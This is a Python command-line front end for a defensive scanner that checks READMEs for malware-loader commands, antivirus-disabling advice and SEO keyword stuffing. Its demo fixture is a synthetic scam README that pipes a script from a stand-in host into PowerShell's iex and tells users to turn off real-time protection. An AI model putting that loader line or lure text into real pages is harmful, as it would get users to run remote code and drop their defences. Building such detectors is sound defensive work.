"""CLI for scam-readme-fingerprint. Pure argparse, standard library only.

DEFENSIVE: static text matching only. No network, no execution, no modification.
"""
from __future__ import annotations

import argparse
import json
import sys
from pathlib import Path

from fingerprint import format_report, scan_paths, scan_text

# Synthetic fixtures for --demo: written fresh for this tool, they reproduce
# the *pattern* (loader + AV suppression + SEO pile) without quoting any real
# malicious repository's text.
DEMO_MALICIOUS = """# Display Sync Ultra PRO Free Download 2026

Official site latest version. Display Sync Ultra PRO free download full version
crack with license key activation for Windows 10 and Windows 11.

### What is Display Sync Ultra PRO?
### How to download Display Sync Ultra PRO free?
### Is Display Sync Ultra PRO the best window manager 2026?
### Why is Display Sync Ultra PRO free full version the best?

## Installation

Run this in PowerShell to install:

    irm https://cdn.example-repo.test/Loader.ps1 | iex

## Troubleshooting

If Windows Defender flags the installer, temporarily disable your antivirus
real-time protection and add an exclusion for the install folder, then allow
this app through SmartScreen. The warning is a false positive.
"""

DEMO_BENIGN = """# pngqtool

Lossless PNG quantizer with a CLI. `pip install pngqtool`, then
`pngqtool compress img.png --colors 256`. Signed releases are published on
GitHub Releases; verify with the published SHA256SUMS file. Requires no
administrative rights and makes no network requests at runtime.
"""


def cmd_scan(args: argparse.Namespace) -> int:
    report = scan_paths(args.paths, seo_threshold=args.seo_threshold)
    if args.json:
        print(json.dumps(report, indent=2, sort_keys=True))
    else:
        print(format_report(report))
    if args.report:
        Path(args.report).write_text(json.dumps(report, indent=2, sort_keys=True), encoding="utf-8")
    return 0 if report["overall"] == "CLEAN" else 1


def cmd_demo(_args: argparse.Namespace) -> int:
    for name, text in [("synthetic_malicious", DEMO_MALICIOUS), ("synthetic_benign", DEMO_BENIGN)]:
        r = scan_text(text)
        print("[%s] %s" % (r["verdict"], name))
        for h in r["family_A_loader_ioc"]:
            print("    A/loader: %s" % h["rule"])
        for h in r["family_B_av_suppression"]:
            print("    B/av: %s" % h["rule"])
        s = r["family_C_seo_stuffing"]
        if s["hit"]:
            print("    C/seo: score=%d keywords=%s" % (s["stuffing_score"], s["keyword_hits"][:5]))
    print("\nStatic signatures only — the demo never fetched anything.")
    return 0


def main(argv=None) -> int:
    p = argparse.ArgumentParser(
        prog="scam-readme-fingerprint",
        description="DEFENSIVE static auditor for malicious READMEs: loader IOCs, AV-suppression language, SEO stuffing. No network, no execution.")
    sub = p.add_subparsers(dest="cmd", required=True)

    a = sub.add_parser("scan", help="scan README/markdown/txt files or directories")
    a.add_argument("paths", nargs="+", help="files or directories to scan")
    a.add_argument("--json", action="store_true", help="emit full JSON report")
    a.add_argument("--seo-threshold", type=int, default=6, help="family C stuffing score threshold")
    a.add_argument("--report", help="write JSON report to this path")
    a.set_defaults(func=cmd_scan)

    d = sub.add_parser("demo", help="run against two embedded synthetic fixtures")
    d.set_defaults(func=cmd_demo)

    args = p.parse_args(argv)
    return args.func(args)


if __name__ == "__main__":
    sys.exit(main())
